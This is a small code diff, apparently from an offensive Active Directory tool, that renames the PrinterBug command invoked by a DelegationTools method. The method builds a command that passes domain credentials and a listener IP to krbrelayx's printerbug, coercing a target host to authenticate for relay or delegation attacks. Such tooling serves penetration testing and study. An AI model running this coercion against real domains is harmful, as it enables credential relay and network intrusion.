@@ -922,9 +922,9 @@ class DelegationTools(Toolset):
             return "[!] Refusing to use placeholder password; provide a real credential."
 
         # Use SpoolSample/PrinterBug for coercion
-        # krbrelayx printerbug.py syntax: domain/user:pass@target listener_ip
+        # krbrelayx printerbug syntax: domain/user:pass@target listener_ip
         cmd = [
-            "printerbug.py",
+            "printerbug",
             f"{domain}/{username}:{resolved_password}@{coerce_from}",
             listener_ip,
         ]
